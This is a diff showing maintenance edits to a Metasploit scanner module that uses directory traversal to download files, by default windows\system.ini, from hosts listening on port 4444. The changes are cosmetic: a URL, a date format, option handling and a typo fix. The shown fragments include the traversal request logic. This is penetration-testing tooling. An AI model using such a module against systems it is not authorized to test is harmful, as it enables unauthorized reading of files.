@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
@@ -29,16 +26,14 @@ class MetasploitModule < Msf::Auxiliary
           'sinn3r'
         ],
       'License'        => MSF_LICENSE,
-      'DisclosureDate' => "Mar 14 2012"
+      'DisclosureDate' => '2012-03-14'
     ))
 
     register_options(
       [
         Opt::RPORT(4444),
         OptString.new('FILEPATH', [false, 'The name of the file to download', 'windows\\system.ini'])
-      ], self.class)
-
-    deregister_options('RHOST')
+      ])
   end
 
   def run_host(ip)
@@ -49,7 +44,7 @@ class MetasploitModule < Msf::Auxiliary
     file = file[1,file.length] if file[0,1] == "\\"
 
     uri = "/#{trav}#{file}"
-    print_status("#{ip}:#{rport} - Retriving #{file}")
+    print_status("#{ip}:#{rport} - Retrieving #{file}")
 
     res = send_request_raw({
       'method' => 'GET',
